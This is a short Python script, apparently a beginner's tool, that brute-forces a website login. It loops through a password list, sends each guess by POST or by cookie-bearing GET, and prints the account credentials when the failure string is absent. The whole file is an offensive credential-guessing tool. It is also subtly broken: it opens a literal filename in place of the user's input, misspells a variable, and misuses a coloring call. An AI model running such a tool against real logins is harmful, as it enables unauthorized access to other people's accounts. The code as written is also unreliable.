import requests
from termcolor import colored

url = input("[+] Enter Page URL: ")
username = input('[+] Enter Username For The Account To BruteForce: ')
password_file = input('[+] Enter Password File To Use: ')
login_fail_string = input('[+] Input The String That Occurs When Login Fails: ')
cookie_value = input('[+] Enter Cookie Value(Optional): ')


def cracking(username, url):
	for password in passwords:
		password = password.strip()
		print(colored('Trying....', password), 'red')
		data = {'username':username, 'password':password, 'Login':'Login'} # This is the form data that the page sends when logging in
		if cookie_value != '':
			response = requests.get(url, params = {'username':username, 'password':password, 'Login':'Login'}, cookies = {'Cookie' : cookie_value}) # This is the form data that the page sends when logging in
		else:
			responce = requests.post(url, data=data)
		if login_fail_string in response.content.decode():
			pass
		else:
			print(colored('[+] Found Username: ==>' + username, 'green'))
			print(colored('[+] Found Password: ==>' + password, 'green'))
			exit()



with open('password_file', 'r') as passwords:
	cracking(username, url)

print('[!!] Password Not In List')